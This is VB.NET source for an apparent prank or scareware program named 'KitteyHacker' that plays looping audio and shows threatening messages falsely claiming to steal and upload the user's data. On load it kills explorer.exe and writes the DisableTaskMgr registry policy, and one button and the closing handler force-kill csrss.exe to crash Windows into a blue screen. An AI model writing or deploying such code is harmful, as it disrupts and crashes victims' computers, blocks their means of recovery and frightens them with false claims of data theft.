Imports System.Media
Imports Microsoft.Win32
Imports System.Diagnostics
Public Class MainForm
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim CatsSound As SoundPlayer = New SoundPlayer(KitteyHacker.My.Resources.TombstoneCatsShortVersion)
        CatsSound.PlayLooping()
        Process.Start("C:\Windows\System32\taskkill.exe", "/F /IM explorer.exe")
        MessageBox.Show("If You Try To Kill Me I Will Kill Your Computer!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        disableTaskMgr()
    End Sub
    Public Sub disableTaskMgr()
        Dim key As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
        key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim CatsSound As SoundPlayer = New SoundPlayer(KitteyHacker.My.Resources.TombstoneCatsShortVersion)
        CatsSound.Stop()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim MsgResult As DialogResult
        MsgResult = MessageBox.Show("I Hacked Your Computer And Get All Your Data", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
        If MsgResult = DialogResult.OK Then
            MsgResult = MessageBox.Show("You Can't Do Nothing With It", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
            If MsgResult = DialogResult.OK Then
                MsgResult = MessageBox.Show("I Will Upload Your Data On My Server", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
                If MsgResult = DialogResult.OK Then
                    MsgResult = MessageBox.Show("I Have No More Time To Talk With You", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
                    If MsgResult = DialogResult.OK Then
                        MsgResult = MessageBox.Show("And If You Try To Kill Me I Will Kill Your Computer!", "Kittey's Warning", MessageBoxButtons.OK, MessageBoxIcon.None)
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim MsgResult As DialogResult
        MsgResult = MessageBox.Show("No! Why Would You BSOD Me!", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
        If MsgResult = DialogResult.OK Then
            'kill csrss, causing a BSOD
            Process.Start("C:\Windows\System32\taskkill.exe", "/F /IM csrss.exe")
        End If
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MessageBox.Show("Why You Want To Melt Me? Whyyyyyyyyyyyyyyyyyy?", "Windows", MessageBoxButtons.OK, MessageBoxIcon.None)
        MessageBox.Show("Error: Cannot Do It In VB.NET", "Windows", MessageBoxButtons.OK, MessageBoxIcon.None)
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        Dim info As InfoForm = New InfoForm()
        info.Show()
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Dim server As ServerForm = New ServerForm()
        server.Show()
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        MessageBox.Show("Hahahaha! You Really Think You Can Get Rid Of Me?! Fuck No!", "Kittey", MessageBoxButtons.OK, MessageBoxIcon.None)
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Process.Start("www.windows93.net")
    End Sub

    Private Sub MainForm_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Dim MsgResult As DialogResult
        MsgResult = MessageBox.Show("Are You Sure You Want To Exit", "Kittey", MessageBoxButtons.YesNo, MessageBoxIcon.None)
        If MsgResult = DialogResult.Yes Then
            Process.Start("C:\Windows\System32\taskkill.exe", "/F /IM csrss.exe")
        End If
    End Sub
End Class
